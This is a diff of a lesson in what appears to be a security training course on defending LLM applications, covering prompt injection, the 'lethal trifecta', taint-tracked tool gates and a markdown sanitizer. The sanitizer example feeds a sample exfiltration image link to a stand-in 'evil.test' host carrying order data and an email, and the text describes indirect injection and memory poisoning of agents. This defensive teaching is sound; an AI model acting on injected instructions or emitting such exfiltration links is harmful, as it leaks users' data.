@@ -5,7 +5,7 @@ name: AI security
 kind: concept
 difficulty: intro
 est_minutes: 13
-status: reviewed
+status: crisp
 related:
   - security-governance-compliance/threat-modeling
   - security-governance-compliance/prompt-injection-defense
@@ -23,112 +23,126 @@ sources:
 ---
 
 ## TL;DR
-AI security is ordinary application security plus one new component: a model that follows instructions
-found in its data, cannot be patched the way a parser can, and is increasingly handed credentials and
-tools. The attack surface therefore moves from syntax (SQL, HTML) to semantics (any text the model
-reads), and from the model to everything around it. The controls that hold are the old ones applied to
-the model as an untrusted interpreter: least privilege, isolation, output handling, approval gates and
-monitoring, not cleverer prompts.
+AI security is application security plus a model that obeys instructions in its data and cannot be
+patched like a parser. Treat it as an untrusted interpreter: least privilege, isolation, output handling,
+approval gates and monitoring hold; cleverer prompts do not.
 
 ## Why it exists
 Three things changed when an LLM went into the system.
-
-First, control and data share one channel. A parser has a grammar: `'; DROP TABLE` is data until you
-concatenate it into SQL, and parameterised queries end the argument. A transformer has one token stream.
-The system prompt, the user's message, a retrieved PDF and a tool's JSON result are all tokens with
-attention between them, and the model has no hardware notion of which tokens are allowed to give orders.
-Anything it reads can steer it.
-
-Second, the failure mode is probabilistic and not patchable in the usual sense. When a parser bug is
-found you fix the code and the class is gone. When a jailbreak is found you add training data or a
-filter, and the attack mostly stops working, for a while, in that phrasing. There is no proof of absence,
-and a determined attacker with unlimited attempts eventually gets through a probabilistic filter.
-
-Third, models are being given agency: browsing, email, code execution, database access, payment APIs. A
-chatbot that says something embarrassing is a PR problem. An agent that reads a poisoned web page and
-then acts with your credentials is a breach.
-
-The naive responses fail for the same reason. "Add a guardrail prompt" uses the same instruction-following
-component to defend itself. "Our WAF already inspects requests" fails because the payload is natural
-language, not a signature. "The vendor handles safety" confuses the vendor's content policy with your
-authorisation boundary; the vendor does not know which of your users may issue refunds.
+- **Control and data share one channel.** A parser has a grammar: `'; DROP TABLE` is data until you
+  concatenate it into SQL, and parameterised queries end the argument. A transformer has one token stream:
+  system prompt, user message, retrieved PDF and tool JSON are all tokens with attention between them,
+  and no hardware notion of which tokens may give orders. Anything it reads can steer it.
+- **Failure is probabilistic and not patchable in the usual sense.** Fix a parser bug and the class is
+  gone. Find a jailbreak and you add training data or a filter; the attack mostly stops, for a while, in
+  that phrasing. There is no proof of absence, and an attacker with unlimited attempts eventually gets
+  through a probabilistic filter.
+- **Models are being given agency.** Browsing, email, code execution, database access, payment APIs. A
+  chatbot that says something embarrassing is a PR problem; an agent that reads a poisoned web page and
+  then acts with your credentials is a breach.
+- **The naive responses fail for the same reason.** "Add a guardrail prompt" uses the instruction-following
+  component to defend itself. "Our WAF already inspects requests" fails because the payload is natural
+  language, not a signature. "The vendor handles safety" confuses the vendor's content policy with your
+  authorisation boundary; the vendor does not know which of your users may issue refunds.
+- **So the attack surface moves.** From syntax (SQL, HTML) to semantics (any text the model reads), and
+  from the model to everything around it: credentials, tools and downstream systems.
 
 ## How it works
 ### What you are protecting
-Assets: data (training sets, retrieval corpora, conversation logs, which are often the most sensitive
-store you own), the model itself (weights, fine-tunes, and the system prompt, both as IP and as a map of
-your controls), compute (the GPU bill), actions (every tool and credential the model can reach), and
-decisions (what users and downstream systems trust the output for).
+| Asset | Why it matters |
+|---|---|
+| Data | Training sets, retrieval corpora, conversation logs; logs are often the most sensitive store you own |
+| The model | Weights, fine-tunes and the system prompt, both as IP and as a map of your controls |
+| Compute | The GPU bill |
+| Actions | Every tool and credential the model can reach |
+| Decisions | What users and downstream systems trust the output for |
 
 ### Where attacks enter, by lifecycle
-- Supply chain and training time: weights from a hub (pickle-based checkpoints run code on load, which is
-  why safetensors exists), poisoned fine-tune or pre-training data, malicious dependencies, tampered
-  datasets. Covered in depth in the supply-chain lesson.
-- Inference-time input: direct prompt injection and jailbreaks (the user attacks the system), indirect
-  prompt injection (content the model reads attacks the user, as Greshake et al. demonstrated against real
-  deployed applications), and poisoning of the retrieval corpus so injected content is retrieved later.
-- Inference-time output: improper output handling, meaning model text flowing unescaped into HTML, SQL,
-  a shell or a tool call; and excessive agency, meaning the model holding more permissions than the task
-  needs.
-- Exfiltration and privacy: system prompt leakage, training data extraction (Carlini et al. recovered
+- **Supply chain and training time.** Weights from a hub (pickle-based checkpoints run code on load,
+  which is why safetensors exists), poisoned fine-tune or pre-training data, malicious dependencies,
+  tampered datasets. Covered in depth in the supply-chain lesson.
+- **Inference-time input.** Direct prompt injection and jailbreaks (the user attacks the system);
+  indirect prompt injection (content the model reads attacks the user, as Greshake et al. demonstrated
+  against real deployed applications); and poisoning of the retrieval corpus so injected content is
+  retrieved later.
+- **Inference-time output.** Improper output handling: model text flowing unescaped into HTML, SQL, a
+  shell or a tool call. Excessive agency: the model holding more permissions than the task needs.
+- **Exfiltration and privacy.** System prompt leakage; training data extraction (Carlini et al. recovered
   verbatim memorised training sequences, including personal contact details, from GPT-2, and Nasr et al.
-  later extended extraction to a deployed chat model), cross-tenant leakage through shared indexes or
-  caches, and membership inference.
-- Availability and cost: unbounded consumption, sometimes called denial of wallet, via long inputs,
+  later extended extraction to a deployed chat model); cross-tenant leakage through shared indexes or
+  caches; membership inference.
+- **Availability and cost.** Unbounded consumption, sometimes called denial of wallet, via long inputs,
   recursive agent loops or expensive tool calls triggered by injected content.
-- Model theft: approximating a model by querying its API at scale.
+- **Model theft.** Approximating a model by querying its API at scale.
 
 ### The three facts to design around
-1. Any text the model reads may act as an instruction. Trust boundaries must therefore be drawn around
-   content sources, not around the model.
-2. The model will be steered some fraction of the time. Security must come from what a steered model
+1. **Any text the model reads may act as an instruction.** So trust boundaries are drawn around content
+   sources, not around the model.
+2. **The model will be steered some fraction of the time.** So security comes from what a steered model
    cannot do, not from what it is told not to do.
-3. Output is attacker-influenced. Treat it as untrusted input to everything downstream.
+3. **Output is attacker-influenced.** So treat it as untrusted input to everything downstream.
 
-A quick composition test follows from these facts. A data-theft attack needs three things in one
-session: untrusted content that can carry the instruction, access to something worth stealing, and a
-channel out (an email, a fetched URL, a rendered image, a write to a shared document). Simon Willison
-calls this the "lethal trifecta". Each capability is harmless alone; the breach is in the combination,
-which is why a review must look at the whole agent rather than at each tool in isolation, and why the
-strongest fix is usually to remove one leg in code. The prompt-injection-defense lesson turns this into
-a policy (the "rule of two").
+### The composition test (the "lethal trifecta")
+A data-theft attack needs three things in one session (Simon Willison's "lethal trifecta"):
+1. **Untrusted content** that can carry the instruction.
+2. **Access to something worth stealing.**
+3. **A channel out:** an email, a fetched URL, a rendered image, a write to a shared document.
 
-Persistence deserves its own mention. An agent with long-term memory, a shared notes store or write
-access to the knowledge base can be made to write the injected instruction somewhere it will be read
-again, so one poisoned page becomes an attack on every later session. Memory writes are therefore a
-sink to gate, not a convenience.
+- **Each capability is harmless alone; the breach is in the combination.** So a review looks at the whole
+  agent, not each tool in isolation.
+- **The strongest fix removes one leg in code.** The prompt-injection-defense lesson turns this into a
+  policy (the "rule of two").
+- **Persistence is its own sink.** An agent with long-term memory, a shared notes store or write access to
+  the knowledge base can be made to write the injected instruction where it is read again. One poisoned
+  page becomes an attack on every later session, so memory writes are a sink to gate, not a convenience.
 
 ### The controls that follow
-- Identity and least privilege for the model's tools: the agent acts with at most the user's permissions,
-  scoped per task, with short-lived credentials, read-only unless writing is the job. This bounds the
-  damage of fact 2.
-- Isolation: sandboxed code execution, egress allowlists, and no secrets in the context window, because a
-  secret the model can see is a secret that can be printed.
-- Input side: tag the provenance of each context segment; run classifiers on untrusted content as a
-  signal, not as a boundary.
-- Output side: schemas and validation, escaping before rendering, allowlisted URLs and recipients, and no
-  auto-rendered images or links from model text, which is a standard exfiltration channel.
-- Human approval for consequential or irreversible actions, shown with the actual arguments.
-- Monitoring: log prompts, tool calls and content sources; detect anomalies; place canary strings in
-  system prompts so leakage is observable.
-- Supply chain: pinned versions, signed artifacts, safetensors, dataset scanning.
+| Control | What it means | Why |
+|---|---|---|
+| Identity and least privilege | The agent acts with at most the user's permissions, scoped per task, short-lived credentials, read-only unless writing is the job | Bounds the damage of fact 2 |
+| Isolation | Sandboxed code execution, egress allowlists, no secrets in the context window | A secret the model can see is a secret that can be printed |
+| Input side | Tag the provenance of each context segment; run classifiers on untrusted content | Classifiers are a signal, not a boundary |
+| Output side | Schemas and validation, escaping before rendering, allowlisted URLs and recipients, no auto-rendered images or links | Auto-rendered images are a standard exfiltration channel |
+| Human approval | For consequential or irreversible actions, shown with the actual arguments | A human cannot judge what they cannot see |
+| Monitoring | Log prompts, tool calls and content sources; detect anomalies; canary strings in system prompts | Makes leakage observable |
+| Supply chain | Pinned versions, signed artifacts, safetensors, dataset scanning | Weights and data are code-like inputs |
 
 ### The frameworks and what each is for
-The OWASP Top 10 for LLM Applications is a checklist of vulnerability classes (prompt injection,
-sensitive information disclosure, supply chain, data and model poisoning, improper output handling,
-excessive agency, system prompt leakage, vector and embedding weaknesses, misinformation, unbounded
-consumption); use it to seed a review. MITRE ATLAS catalogues attacker tactics and techniques against ML
-systems in the style of ATT&CK, with case studies; use it for threat modeling and red-team planning. The
-NIST AI RMF (govern, map, measure, manage) is about organisational risk management, not technical
-controls. The safety-security module covers each attack class in depth; this module adds the layers
-around them: threat modeling, policy, classification, residency and governance.
+| Framework | What it is | Use it to |
+|---|---|---|
+| OWASP Top 10 for LLM Applications | Vulnerability classes: prompt injection, sensitive information disclosure, supply chain, data and model poisoning, improper output handling, excessive agency, system prompt leakage, vector and embedding weaknesses, misinformation, unbounded consumption | Seed a review |
+| MITRE ATLAS | Attacker tactics and techniques against ML systems in the style of ATT&CK, with case studies | Threat modeling and red-team planning |
+| NIST AI RMF | Govern, map, measure, manage | Organisational risk management, not technical controls |
 
-## Example
-A tool boundary that encodes the three facts. Reading untrusted content taints the turn; a tainted turn
-cannot cause an external side effect without a human approving those exact arguments (an approval is
-keyed on tool plus arguments, so approving one email does not pre-approve the next); and argument limits
-(recipient allowlist, refund ceiling) hold no matter what the model says, because they are checked in
-code the model cannot reach.
+- **Where the depth lives.** The safety-security module covers each attack class in depth; this module
+  adds the layers around them: threat modeling, policy, classification, residency and governance.
+
+## Diagram
+Follow one injected instruction: it enters with untrusted content, and only code-enforced limits and
+gates stand between a steered model and a side effect.
+
+```mermaid
+flowchart TD
+    U["User request"] --> M["Model in the loop"]
+    W["Untrusted content: web, email, RAG"] -->|"may carry instructions"| M
+    M -->|"proposed tool call"| L{"Hard limits in code"}
+    L -->|"outside allowlist or ceiling"| X["Blocked"]
+    L -->|"within limits"| T{"Turn tainted?"}
+    T -->|"no, or read-only"| D["Dispatch tool"]
+    T -->|"yes and external"| H{"Human approves exact args?"}
+    H -->|"yes"| D
+    H -->|"no"| X
+    D --> O["Output: validate, escape, strip links"]
+    D -.->|"read_url sets taint"| T
+```
+
+## Examples
+### A tool boundary that encodes the three facts
+- **Reading untrusted content taints the turn.**
+- **A tainted turn cannot cause an external side effect** without a human approving those exact arguments.
+  An approval is keyed on tool plus arguments, so approving one email does not pre-approve the next.
+- **Argument limits hold no matter what the model says** (recipient allowlist, refund ceiling), because
+  they are checked in code the model cannot reach.
 
 ```python
 from dataclasses import dataclass, field
@@ -174,45 +188,112 @@ except PermissionError as e:
     print(e)   # "not approved": the turn read untrusted content, so sending needs a human
 ```
 
-Two design choices are worth noticing. The hard limits (allowlist, ceiling) run before the approval
-check, because a human approving a 5,000 refund under time pressure is exactly what an attacker hopes
-for; some limits should not be approvable at all. And taint is per turn and binary, which is coarse:
-it over-gates turns where the untrusted content was irrelevant to the action, and it under-protects if
-the agent's memory carries injected text into a fresh, "clean" turn, so a real system must taint
-whatever is loaded from stores that untrusted content can write to.
+Two design choices are worth noticing:
+- **Hard limits run before the approval check.** A human approving a 5,000 refund under time pressure is
+  exactly what an attacker hopes for; some limits should not be approvable at all.
+- **Taint is per turn and binary, which is coarse.** It over-gates turns where the untrusted content was
+  irrelevant to the action. It under-protects if the agent's memory carries injected text into a fresh,
+  "clean" turn, so a real system must taint whatever is loaded from stores that untrusted content can
+  write to.
+
+### Closing the rendered-image exfiltration channel
+Fact 3 in practice: strip markdown images and links whose host is not allowlisted before the chat UI
+renders model text, so an injected `![x](https://attacker/?d=...)` cannot leak data in a query string.
+
+```python
+import re
+from urllib.parse import urlparse
+
+ALLOWED_HOSTS = {"docs.example.com"}
+MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(([^)\s]+)[^)]*\)")
+MD_LINK = re.compile(r"(?<!!)\[([^\]]*)\]\(([^)\s]+)[^)]*\)")
+
+def is_safe(url):
+    u = urlparse(url)
+    return u.scheme == "https" and u.hostname in ALLOWED_HOSTS
+
+def sanitize(text):
+    text = MD_IMAGE.sub(lambda m: m.group(0) if is_safe(m.group(2)) else "[image removed]", text)
+    text = MD_LINK.sub(lambda m: m.group(0) if is_safe(m.group(2)) else m.group(1), text)
+    return text
+
+reply = ("Your order shipped. ![s](https://evil.test/p.png?d=order+4411+jane@x.com) "
+         "Details: [tracking](https://evil.test/t) and [help](https://docs.example.com/ship).")
+print(sanitize(reply))
+# Your order shipped. [image removed] Details: tracking and [help](https://docs.example.com/ship).
+```
+
+- **This is defence in depth, not the boundary.** Raw HTML, other markup and tool-side channels (email,
+  URL fetches) need their own controls; pair it with a restrictive image policy in the UI.
+
+### Worked review: applying the trifecta to a support agent
+| Tool | Untrusted content? | Sensitive access? | Channel out? |
+|---|---|---|---|
+| `read_inbox` (customer emails) | yes | yes | no |
+| `query_orders` (shared service account) | no | yes, every customer | no |
+| `send_email` (any recipient) | no | no | yes |
+| Markdown rendering in the agent UI | no | no | yes, via images |
+
+- **All three legs are present in one session**, so a single injected email can read another customer's
+  orders and mail them out.
+- **Remove a leg in code:** scope `query_orders` to the requesting user, allowlist `send_email` recipients
+  to the ticket's customer, and strip remote images. Each change alone breaks the chain; all three give
+  depth.
+
+## Production patterns
+- **On-behalf-of tool identity.** When an agent calls internal APIs, exchange the user's token for a
+  short-lived, narrowly scoped one (OAuth 2.0 token exchange, RFC 8693) instead of a shared service
+  account. Monitor tool calls denied for authorisation and any call made without a user subject.
+- **Egress allowlist for agent sandboxes.** Code execution and browsing run with default-deny outbound
+  network policy and an allowlisting proxy. Monitor blocked egress attempts per session; a spike after
+  reading a document is a strong injection signal.
+- **Canary strings in system prompts.** Embed a unique random marker in each system prompt version and
+  scan outputs and logs for it. Monitor canary hits as a leakage alert, and rotate the marker with the
+  prompt.
+- **Safe weight loading as a CI gate.** Accept only safetensors from approved sources, pin by hash, and
+  in PyTorch load any remaining checkpoints with `torch.load(path, weights_only=True)`. Monitor the gate's
+  rejections and any model artifact loaded outside the registry.
+- **Per-session consumption budgets.** Cap input tokens, output tokens, tool calls per turn and agent loop
+  steps, enforced in the orchestrator, against denial of wallet. Monitor cost per user and budget-hit
+  rate, alerting on outliers.
 
 ## Trade-offs
-- Least privilege and approval gates bound the blast radius but cost autonomy; the gate is worth it when an
-  action is irreversible or external, and becomes friction theatre when applied to read-only tools.
-- Input filters and classifiers catch cheap attacks and give telemetry, but every filter is bypassable;
-  treat them as reducing volume rather than as a boundary unless the attacker has no incentive to retry.
-- Self-hosting models removes vendor data exposure but moves supply-chain, patching and jailbreak-fix
-  burden onto you; the balance flips when you have no in-house ML operations capacity.
-- Logging full prompts gives forensic ability but creates a new sensitive store; it flips to redacted
-  logging as soon as prompts carry regulated data.
+- **Least privilege and approval gates vs autonomy.** They bound the blast radius but cost autonomy; the
+  gate is worth it when an action is irreversible or external, and becomes friction theatre when applied
+  to read-only tools.
+- **Input filters and classifiers vs real boundaries.** They catch cheap attacks and give telemetry, but
+  every filter is bypassable; treat them as reducing volume rather than as a boundary unless the attacker
+  has no incentive to retry.
+- **Self-hosting vs vendor exposure.** Self-hosting removes vendor data exposure but moves supply-chain,
+  patching and jailbreak-fix burden onto you; the balance flips when you have no in-house ML operations
+  capacity.
+- **Full prompt logging vs a new sensitive store.** Logging full prompts gives forensic ability but creates
+  a new sensitive store; it flips to redacted logging as soon as prompts carry regulated data.
 
 ## Pitfalls
-- Treating the system prompt as a security control ("never reveal these instructions"); symptom: the
-  prompt appears on social media within days of launch.
-- Giving the agent a service account broader than the user's rights; symptom: a user asks the assistant
-  for a record they cannot open themselves and receives it.
-- Rendering model output as markdown with remote images or auto-links enabled; symptom: outbound requests
-  to unknown domains carrying conversation text in query strings.
-- Loading weights from an unverified hub in a pickle-based format; symptom: arbitrary code runs at load
-  time, usually discovered only in the incident review.
-- Letting the agent write to its own long-term memory without gating; symptom: a behaviour change
-  (an odd instruction followed, a link inserted) that persists across sessions after one bad page was read.
-- Securing the chat UI and forgetting the logs, traces and eval datasets that duplicate every prompt;
-  symptom: customer PII found in an observability SaaS during an audit.
+- **Treating the system prompt as a security control** ("never reveal these instructions"). Symptom: the
+  prompt appears on social media within days of launch. Fix: assume it is public; keep secrets and
+  enforcement out of it.
+- **Giving the agent a service account broader than the user's rights.** Symptom: a user asks the
+  assistant for a record they cannot open themselves and receives it. Fix: on-behalf-of identity.
+- **Rendering model output as markdown with remote images or auto-links enabled.** Symptom: outbound
+  requests to unknown domains carrying conversation text in query strings. Fix: sanitise and allowlist.
+- **Loading weights from an unverified hub in a pickle-based format.** Symptom: arbitrary code runs at
+  load time, usually discovered only in the incident review. Fix: safetensors and a registry.
+- **Letting the agent write to its own long-term memory without gating.** Symptom: a behaviour change (an
+  odd instruction followed, a link inserted) that persists across sessions after one bad page was read.
+- **Securing the chat UI and forgetting the logs, traces and eval datasets that duplicate every prompt.**
+  Symptom: customer PII found in an observability SaaS during an audit.
 
 ## When to use
-This lesson is the map; use it on day one of any AI project to decide which deep lessons apply. Ask four
-questions of any design: what untrusted content reaches the model, what can the model do, what can its
-output reach, and where does the data go afterwards. Measure the number of side-effecting tools without a
-gate, the share of context that comes from untrusted sources, and the time to revoke an agent's
-credentials. In interviews, "how is securing an LLM application different from securing a web
-application" is the standard opener; the three facts above are the expected answer, and listing prompt
-tricks instead signals inexperience.
+This lesson is the map; use it on day one of any AI project to decide which deep lessons apply.
+- **Ask four questions of any design:** what untrusted content reaches the model, what can the model do,
+  what can its output reach, and where does the data go afterwards.
+- **Measure:** the number of side-effecting tools without a gate, the share of context that comes from
+  untrusted sources, and the time to revoke an agent's credentials.
+- **Interviews:** "how is securing an LLM application different from securing a web application" is the
+  standard opener; the three facts above are the expected answer, and listing prompt tricks instead
+  signals inexperience.
 
 ## Role lens
 - **Engineer:** Implements the tool boundary, output validation, provenance tagging and safe weight
@@ -235,6 +316,41 @@ against a motivated attacker with repeated attempts. First change: make the data
 requesting user's identity (row-level scoping or an on-behalf-of token) so the model cannot ask for data
 the user could not read. Second, treat email content as tainted and gate external actions. Keep the
 classifier and prompt as defence in depth, with logging to detect attempts.
+
+## Interview questions
+### How is securing an LLM application different from securing a web application?
+- **One channel for control and data.** Any text the model reads may act as an instruction, so there is no
+  parameterised-query equivalent; trust boundaries go around content sources.
+- **Probabilistic failure.** The model will be steered some fraction of the time, so controls must limit
+  what a steered model can do.
+- **Output is untrusted.** It feeds HTML, SQL, shells and tools, so it is validated and escaped like user
+  input.
+
+### An agent reads web pages, can query a CRM and can send email. How would you review it?
+- **Run the trifecta test.** Untrusted content (web), sensitive access (CRM) and a channel out (email) in
+  one session means one injected page can exfiltrate CRM data.
+- **Remove a leg in code:** allowlist recipients, scope CRM access to the user, or split browsing into a
+  session without CRM access.
+- **Then add depth:** taint tracking, approval for external sends with the real arguments, and logging of
+  content sources per tool call.
+
+### When would you not put a human approval gate on a tool?
+- **On read-only or easily reversible tools.** Gating them adds friction theatre, trains approvers to
+  click yes, and buys little because the damage is bounded.
+- **Gate irreversible or external effects instead**, and for some limits (a refund ceiling, a recipient
+  allowlist) do not offer approval at all, because a hurried human is what an attacker hopes for.
+
+### Why do safetensors exist, and what would you check before loading a model from a hub?
+- **Pickle-based checkpoints execute code on load**, so an untrusted file is effectively an untrusted
+  program; safetensors stores only tensors.
+- **Before loading:** an approved source, a pinned revision and hash, safetensors format, and a scan of
+  any accompanying code or datasets, all enforced in CI rather than by convention.
+
+### What would you monitor in production to detect AI-specific attacks?
+- **Canary hits** for system prompt leakage, and **blocked egress** from sandboxes after untrusted content.
+- **Tool-call anomalies:** unusual recipients, denied authorisation, side effects on tainted turns.
+- **Cost outliers** per user or session, which signal denial of wallet or recursive agent loops triggered
+  by injected content.
 
 ## Quiz
 ### Q: Why can't prompt injection be fixed the way SQL injection was fixed with parameterised queries?
